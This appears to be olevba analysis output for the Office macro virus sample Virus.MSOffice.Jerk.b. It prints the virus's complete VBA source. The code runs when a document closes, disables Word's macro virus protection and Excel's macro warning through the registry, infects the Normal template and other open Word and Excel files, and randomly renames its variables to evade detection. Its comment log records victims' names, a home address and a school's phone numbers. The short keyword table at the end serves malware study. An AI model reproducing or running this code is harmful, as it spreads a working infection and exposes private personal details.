olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-fe08637e5abe0b53c113ff576a66a1475fd9ec80
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b-fe08637e5abe0b53c113ff576a66a1475fd9ec80 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' 07:49:44:  - piątek, 6 paź 2000
' Robert Grudzień*
'


' 12:35:47:  - poniedziałek, 15 maj 2000
' Robert Grudzień*
'


' 12:32:13:  - poniedziałek, 15 maj 2000
' Robert Grudzień*
'


' 04:16:16:  - środa, 26 kwi 2000
' Robert Grudzień*
'


' 06:58:13:  - piątek, 14 kwi 2000
' Robert Grudzień*
'


' 05:17:14:  - czwartek, 6 kwi 2000
' Robert Grudzień*
'


' 05:24:31:  - poniedziałek, 13 mar 2000
' Robert Grudzień*
'


' 05:18:07:  - poniedziałek, 13 mar 2000
' Robert Grudzień*
'


' 05:03:25:  - poniedziałek, 13 mar 2000
' Robert Grudzień*
'


' 08:27:37:  - czwartek, 14 paź 1999
' Lidia Taborska
'


' 12:47:47:  - środa, 1 wrz 1999
' Lidia Taborska
'

































Private Sub Workbook_Deactivate()
On Error Resume Next
Const AYQRREKAAKI = 1, HQYEIYYR = True, RPDEVLEUDLUG = False, ATEUGCHKCZWGBU = 0
Dim LXULSSA, QTTSCRHKD As String
Dim QPCUONRBSZN, UULRZRP As Integer
Dim LQQDLWMIDMY As Boolean
QTTSCRHKD = "ThisWorkbook"
LXULSSA = Application.ThisWorkbook.VBProject.VBComponents.Item(AYQRREKAAKI).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(AYQRREKAAKI).CodeModule.CountOfLines)
Call HOUIUDEC(LXULSSA)
For QPCUONRBSZN = AYQRREKAAKI To Application.Workbooks.Count
LQQDLWMIDMY = RPDEVLEUDLUG
For UULRZRP = AYQRREKAAKI To Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Count
If Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.CountOfLines = ATEUGCHKCZWGBU Then
If Application.Workbooks.Item(QPCUONRBSZN).Path <> "" And Application.Workbooks.Item(QPCUONRBSZN).Saved = HQYEIYYR And LQQDLWMIDMY = RPDEVLEUDLUG Then LQQDLWMIDMY = HQYEIYYR
Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.InsertLines AYQRREKAAKI, LXULSSA
If Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).Name = QTTSCRHKD Then
Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.ReplaceLine AYQRREKAAKI * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.ReplaceLine AYQRREKAAKI * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next UULRZRP
If LQQDLWMIDMY = HQYEIYYR Then Application.Workbooks.Item(QPCUONRBSZN).Save
Next QPCUONRBSZN
End Sub
Private Sub Document_Close()
On Error Resume Next
Const HQYEIYYR = True, RPDEVLEUDLUG = False, ATEUGCHKCZWGBU = 0, AYQRREKAAKI = 1, TGJSDITYPZX = wdFormatDocument, TQUNLDR = wdFormatTemplate, ROPKCQNHQSNR = ":"
Dim LQQDLWMIDMY, FVIXQS, MNEWZOXLKJO, XINMBPWIJKL As Boolean
Dim EONDSCJHMNFR, VMKHGFPTUVLU As Object
Dim ALODBEDHFEA, LXULSSA As String
If Month(AYQRREKAAKI * Now) > AYQRREKAAKI * 2 + AYQRREKAAKI * 3 And Day(AYQRREKAAKI * Now) = 4 + AYQRREKAAKI * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set EONDSCJHMNFR = ActiveDocument.VBProject.VBComponents.Item(AYQRREKAAKI)
Set VMKHGFPTUVLU = NormalTemplate.VBProject.VBComponents.Item(AYQRREKAAKI)
Randomize
MNEWZOXLKJO = RPDEVLEUDLUG
XINMBPWIJKL = RPDEVLEUDLUG
If EONDSCJHMNFR.CodeModule.CountOfLines <> ATEUGCHKCZWGBU Then MNEWZOXLKJO = HQYEIYYR
If VMKHGFPTUVLU.CodeModule.CountOfLines <> ATEUGCHKCZWGBU Then XINMBPWIJKL = HQYEIYYR
Options.VirusProtection = RPDEVLEUDLUG
If (MNEWZOXLKJO = HQYEIYYR Xor XINMBPWIJKL = HQYEIYYR) And (ActiveDocument.SaveFormat = TGJSDITYPZX Or ActiveDocument.SaveFormat = TQUNLDR) Then
If MNEWZOXLKJO = HQYEIYYR Then
FVIXQS = NormalTemplate.Saved
LXULSSA = EONDSCJHMNFR.CodeModule.Lines(AYQRREKAAKI, EONDSCJHMNFR.CodeModule.CountOfLines)
Call YEPITPVGK(LXULSSA)
If Int(Rnd * 10 * AYQRREKAAKI) = AYQRREKAAKI * 7 Then Call FGAVGOFCZYR(LXULSSA)
Call MGTPBTRNFTRWI(LXULSSA)
VMKHGFPTUVLU.CodeModule.InsertLines AYQRREKAAKI, LXULSSA
If FVIXQS = HQYEIYYR Then NormalTemplate.Save
End If
ALODBEDHFEA = Mid(ActiveDocument.FullName, 2, AYQRREKAAKI)
If XINMBPWIJKL = HQYEIYYR And (ALODBEDHFEA = ROPKCQNHQSNR Or ActiveDocument.Saved = RPDEVLEUDLUG) Then
LQQDLWMIDMY = ActiveDocument.Saved
LXULSSA = VMKHGFPTUVLU.CodeModule.Lines(AYQRREKAAKI, VMKHGFPTUVLU.CodeModule.CountOfLines)
Call MGTPBTRNFTRWI(LXULSSA)
EONDSCJHMNFR.CodeModule.InsertLines AYQRREKAAKI, LXULSSA
If LQQDLWMIDMY = HQYEIYYR Then ActiveDocument.Save
End If
End If
End Sub
Private Sub FGAVGOFCZYR(ByRef LXULSSA As String)
On Error Resume Next
Const UWHCRNSWLCRMPYL = 48, PWVKHX = 15, ITXMHHFGMTF = 5, ZAIMKQZF = 65, TWDBDSCGQW = 90, AYQRREKAAKI = 1, HQYEIYYR = True, RPDEVLEUDLUG = False
Dim LRCELXAMFSNTTLJ, FOISSQRTmp, VOBFWAONRJKOI, FOISSQR(AYQRREKAAKI To UWHCRNSWLCRMPYL), FOISSQR2(AYQRREKAAKI To UWHCRNSWLCRMPYL) As String
Dim QPCUONRBSZN, UULRZRP, IEPRV As Integer
Dim WHXDIHIBEWCHGWU As Boolean
LRCELXAMFSNTTLJ = "LXULSSA UWHCRNSWLCRMPYL FOISSQR FOISSQR2 VOBFWAONRJKOI QPCUONRBSZN UULRZRP IEPRV WHXDIHIBEWCHGWU FGAVGOFCZYR PWVKHX ITXMHHFGMTF ZAIMKQZF TWDBDSCGQW AYQRREKAAKI LRCELXAMFSNTTLJ FOISSQRTmp LQQDLWMIDMY FVIXQS MNEWZOXLKJO XINMBPWIJKL EONDSCJHMNFR VMKHGFPTUVLU YEPITPVGK RMQMETUDTNDM NAMILW BBZHFKVN IIGXGVZEGVOFD RMQMETUDTNDMTmp WLLYAI AFRVHB ALODBEDHFEA HQYEIYYR RPDEVLEUDLUG ATEUGCHKCZWGBU TGJSDITYPZX TQUNLDR OEVWHJGXQESF PERFLJZSROECYRI ROPKCQNHQSNR CPAUTNUHDW GURCRPEWLAXF QTTSCRHKD HOUIUDEC MGTPBTRNFTRWI CDIBK DYZDTXCCF FMEPKNKHIZTK"
Randomize
UULRZRP = AYQRREKAAKI
For QPCUONRBSZN = AYQRREKAAKI To Len(LRCELXAMFSNTTLJ)
If Mid(LRCELXAMFSNTTLJ, QPCUONRBSZN, AYQRREKAAKI) = " " Or QPCUONRBSZN = Len(LRCELXAMFSNTTLJ) Then
If QPCUONRBSZN = Len(LRCELXAMFSNTTLJ) Then FOISSQRTmp = FOISSQRTmp & Mid(LRCELXAMFSNTTLJ, QPCUONRBSZN, AYQRREKAAKI)
For IEPRV = AYQRREKAAKI To Int((PWVKHX - ITXMHHFGMTF + AYQRREKAAKI) * Rnd + ITXMHHFGMTF)
FOISSQR2(UULRZRP) = FOISSQR2(UULRZRP) & Chr(Int((TWDBDSCGQW - ZAIMKQZF + AYQRREKAAKI) * Rnd + ZAIMKQZF))
Next IEPRV
FOISSQR(UULRZRP) = FOISSQRTmp
FOISSQRTmp = ""
UULRZRP = UULRZRP + AYQRREKAAKI
Else
FOISSQRTmp = FOISSQRTmp & Mid(LRCELXAMFSNTTLJ, QPCUONRBSZN, AYQRREKAAKI)
End If
Next QPCUONRBSZN
WHXDIHIBEWCHGWU = RPDEVLEUDLUG
For QPCUONRBSZN = AYQRREKAAKI To Len(LXULSSA)
For UULRZRP = AYQRREKAAKI To UWHCRNSWLCRMPYL
If Mid(LXULSSA, QPCUONRBSZN, Len(FOISSQR(UULRZRP))) = FOISSQR(UULRZRP) Then
VOBFWAONRJKOI = VOBFWAONRJKOI & FOISSQR2(UULRZRP)
QPCUONRBSZN = QPCUONRBSZN + Len(FOISSQR(UULRZRP)) - AYQRREKAAKI
WHXDIHIBEWCHGWU = HQYEIYYR
Exit For
End If
Next UULRZRP
If WHXDIHIBEWCHGWU = RPDEVLEUDLUG Then
VOBFWAONRJKOI = VOBFWAONRJKOI & Mid(LXULSSA, QPCUONRBSZN, AYQRREKAAKI)
Else
WHXDIHIBEWCHGWU = RPDEVLEUDLUG
End If
Next QPCUONRBSZN
LXULSSA = VOBFWAONRJKOI
End Sub
Private Sub YEPITPVGK(ByRef LXULSSA As String)
On Error Resume Next
Const IIGXGVZEGVOFD = "' ", AYQRREKAAKI = 1
Const OEVWHJGXQESF = "hh:mm:ss: AMPM - ", PERFLJZSROECYRI = "dddd, d mmm yyyy"
Dim RMQMETUDTNDMTmp, RMQMETUDTNDM, WLLYAI, AFRVHB, NAMILW, BBZHFKVN As String
Dim QPCUONRBSZN As Integer
NAMILW = Chr(10 * AYQRREKAAKI + 3)
RMQMETUDTNDM = Application.UserAddress
AFRVHB = Format(Time, OEVWHJGXQESF) & Format(Date, PERFLJZSROECYRI)
BBZHFKVN = Chr(AYQRREKAAKI * 10)
WLLYAI = Application.UserName
For QPCUONRBSZN = AYQRREKAAKI To Len(RMQMETUDTNDM)
If Mid(RMQMETUDTNDM, QPCUONRBSZN, AYQRREKAAKI) <> NAMILW Then
If Mid(RMQMETUDTNDM, QPCUONRBSZN, AYQRREKAAKI) <> BBZHFKVN Then
RMQMETUDTNDMTmp = RMQMETUDTNDMTmp & Mid(RMQMETUDTNDM, QPCUONRBSZN, AYQRREKAAKI)
End If
Else
RMQMETUDTNDMTmp = RMQMETUDTNDMTmp & NAMILW & IIGXGVZEGVOFD
End If
Next QPCUONRBSZN
LXULSSA = LXULSSA & NAMILW & IIGXGVZEGVOFD & AFRVHB & NAMILW & IIGXGVZEGVOFD & WLLYAI & NAMILW & IIGXGVZEGVOFD & RMQMETUDTNDM & NAMILW
End Sub
Private Sub MGTPBTRNFTRWI(ByVal LXULSSA As String)
On Error Resume Next
Dim FMEPKNKHIZTK As Long
Dim CPAUTNUHDW As Object
Dim CDIBK, DYZDTXCCF As String
CDIBK = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
FMEPKNKHIZTK = &H0
DYZDTXCCF = "Options6"
System.PrivateProfileString("", CDIBK, DYZDTXCCF) = FMEPKNKHIZTK
Set CPAUTNUHDW = GetObject(, "Excel.Application")
Const AYQRREKAAKI = 1, ATEUGCHKCZWGBU = 0
Dim QTTSCRHKD As String
Dim QPCUONRBSZN, UULRZRP As Integer
QTTSCRHKD = "ThisWorkbook"
For QPCUONRBSZN = AYQRREKAAKI To CPAUTNUHDW.Application.Workbooks.Count
For UULRZRP = AYQRREKAAKI To CPAUTNUHDW.Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Count
If CPAUTNUHDW.Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.CountOfLines = ATEUGCHKCZWGBU Then
CPAUTNUHDW.Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.InsertLines AYQRREKAAKI, LXULSSA
If CPAUTNUHDW.Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).Name = QTTSCRHKD Then
CPAUTNUHDW.Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.ReplaceLine 33 * AYQRREKAAKI, "Private Sub Workbook_Deactivate()"
Else
CPAUTNUHDW.Application.Workbooks.Item(QPCUONRBSZN).VBProject.VBComponents.Item(UULRZRP).CodeModule.ReplaceLine AYQRREKAAKI * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next UULRZRP
Next QPCUONRBSZN
Set CPAUTNUHDW = Nothing
End Sub
Private Sub HOUIUDEC(ByVal LXULSSA As String)
On Error Resume Next
Const HQYEIYYR = True, RPDEVLEUDLUG = False, AYQRREKAAKI = 1, ATEUGCHKCZWGBU = 0
Dim GURCRPEWLAXF As Object
Dim FVIXQS As Boolean
Set GURCRPEWLAXF = GetObject(, "Word.Application")
If GURCRPEWLAXF.NormalTemplate.VBProject.VBComponents.Item(AYQRREKAAKI).CodeModule.CountOfLines = ATEUGCHKCZWGBU Then
FVIXQS = GURCRPEWLAXF.NormalTemplate.Saved
GURCRPEWLAXF.Options.VirusProtection = RPDEVLEUDLUG
GURCRPEWLAXF.NormalTemplate.VBProject.VBComponents.Item(AYQRREKAAKI).CodeModule.InsertLines AYQRREKAAKI, LXULSSA
If FVIXQS = HQYEIYYR Then GURCRPEWLAXF.NormalTemplate.Save
End If
Set GURCRPEWLAXF = Nothing
End Sub

' 09:50:58:  - Saturday, 13 Apr 1997
' Fred Cohen
' fc@all.net

' 01:50:20:  - torsdag, 4 mar 1999
' Miroslaw Przybycien
'

' 04:17:18:  - środa, 17 mar 1999
' PMP Kancelaria Doradcza
'

' 06:10:52:  - poniedziałek, 17 maj 1999
' .
'

' 07:10:58:  - poniedziałek, 31 maj 1999
' Mieczysław Warias
'

' 09:42:29:  - poniedziałek, 7 cze 1999
' X  X  X
'

' 05:51:19:  - środa, 9 cze 1999
' Lidia Taborska
'

' 03:13:59:  - środa, 1 mar 2000
' Robert Grudzień*
'

' 03:38:09:  - piątek, 27 paź 2000
' Wiesława Grudzień
'

' 09:44:08:  - poniedziałek, 5 lut 2001
' *
'

' 12:20:36:  - poniedziałek, 13 sie 2001
' Sitarski Henryk
' Henryk Sitarski
Melonek 17
26-025 Łagów
woj.świętokrzyskie

' 05:41:18:  - sobota, 29 gru 2001
' .
'

' 04:33:31:  - sobota, 31 maj 2003
' user
' Publiczna Szkoła Podstawowa
w Jastrzębskiej Woli
27-570 Iwaniska
tel./015/8601216
kom 0.600717956

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

